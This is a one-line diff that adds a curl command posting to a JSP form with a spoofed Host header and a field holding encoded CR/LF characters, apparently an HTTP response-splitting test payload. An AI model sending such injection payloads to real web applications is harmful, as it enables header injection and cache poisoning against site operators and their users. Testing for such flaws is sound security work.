@@ -1,0 +1,1 @@
+curl -X POST http://hello.app:4080/someform.jsp -H "Host: localhost" -d "variableX=bar&variable2=Y&var=sdfdsf&sdfds=%0d%0d%0d%0d%0a%0a%0Response_splitt_payload=restofdata"
